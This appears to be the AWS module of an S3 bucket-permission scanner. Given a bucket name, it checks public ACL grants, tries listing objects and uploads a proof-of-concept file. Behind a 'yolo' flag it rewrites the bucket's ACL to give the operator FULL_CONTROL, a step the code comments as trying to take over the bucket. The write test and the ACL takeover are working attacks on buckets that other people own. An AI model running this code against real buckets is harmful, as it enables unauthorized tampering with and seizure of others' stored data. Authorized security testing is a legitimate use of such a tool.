import boto3
import os
import io
import logging
import string
import requests

from botocore.exceptions import ClientError
from bucketsperm.models import BaseWorker, Bucket, BucketNotFound


log = logging.getLogger()


class AWS(BaseWorker):
    name = "s3"
    references = [
        "https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/#bucket-write-acp"
    ]

    client = boto3.client(
        "s3",
        aws_access_key_id=os.getenv("AWS_ACCESS_KEY_ID"),
        aws_secret_access_key=os.getenv("AWS_SECRET_ACCESS_KEY"),
    )
    s3 = boto3.resource("s3")

    def run(self):

        r = requests.head(f"http://{self.bucket_name}.s3.amazonaws.com")
        if r.status_code == 404:
            raise BucketNotFound

        bucket = self.s3.Bucket(self.bucket_name)

        permissions = Bucket(url=f"https://{self.bucket_name}.s3.amazonaws.com")

        bucket_acl = []
        try:
            bucket_acl = bucket.Acl().grants
            permissions.read_acp = True

            for b in bucket_acl:
                if "AllUsers" in b["Grantee"].get(
                    "URI", []
                ) or "AuthenticatedUsers" in b["Grantee"].get("URI", []):
                    if (
                        b["Permission"] == "FULL_CONTROL"
                        or b["Permission"] == "WRITE_ACP"
                    ):
                        permissions.write_acp = True
                    if b["Permission"] == "READ":
                        permissions.list_ = True
                    if b["Permission"] == "WRITE":
                        permissions.write = True

            return permissions  # No need to continue, we have everything we need

        except ClientError as e:
            if e.response["Error"]["Code"] not in {"AccessDenied", "AllAccessDisabled"}:
                log.exception("Read BucketAcl unexpected error!")
        except Exception:
            log.exception("Read BucketAcl failed!")

        try:
            for _ in bucket.objects.all():
                break  # We just need to detect if iterator starts
            permissions.list_ = True
        except ClientError as e:
            if e.response["Error"]["Code"] == "NoSuchBucket":
                raise BucketNotFound
            elif e.response["Error"]["Code"] not in {
                "AccessDenied",
                "AllAccessDisabled",
            }:
                log.exception("List Bucket unexpected error!")
        except Exception:
            log.exception("List Bucket failed!")

        try:
            bucket.upload_fileobj(io.BytesIO(self.poc_text), self.poc_filename)
            permissions.write = True
        except ClientError as e:
            if e.response["Error"]["Code"] not in {"AccessDenied", "AllAccessDisabled"}:
                log.exception("Write to bucket unexpected error!")
        except Exception:
            log.exception("Write to bucket failed!")

        try:
            if self.yolo:
                # Try to take over the bucket
                owner = {
                    "DisplayName": os.getenv("AWS_USER"),
                    "ID": os.getenv("AWS_ID"),
                }
                for acl in bucket_acl:
                    if acl["Permission"] == "FULL_CONTROL" and acl["Grantee"].get("ID"):
                        # Try to guess the current owner of the bucket
                        owner = {
                            "DisplayName": acl["Grantee"]["DisplayName"],
                            "ID": acl["Grantee"]["ID"],
                        }

                bucket_acl.append(
                    {
                        "Grantee": {
                            "DisplayName": os.getenv("AWS_USER"),
                            "ID": os.getenv("AWS_ID"),
                            "Type": "CanonicalUser",
                        },
                        "Permission": "FULL_CONTROL",
                    }
                )

                bucket.Acl().put(
                    AccessControlPolicy={"Grants": bucket_acl, "Owner": owner}
                )
                permissions.write_acp = True
        except ClientError as e:
            if e.response["Error"]["Code"] not in {"AccessDenied", "AllAccessDisabled"}:
                log.exception("Write BucketAcl unexpected error!")
        except Exception:
            log.exception("Write BucketAcl failed!")

        return permissions

    @staticmethod
    def validate_bucket_name(bucket_name):
        if len(bucket_name) < 3 or len(bucket_name) > 63:
            return False

        allowed_chars = set(string.digits + string.ascii_letters + "-.")

        if any(c not in allowed_chars for c in bucket_name):
            return False

        if any(
            c not in set(string.ascii_letters + string.digits)
            for c in [bucket_name[0], bucket_name[-1]]
        ):
            return False

        return True
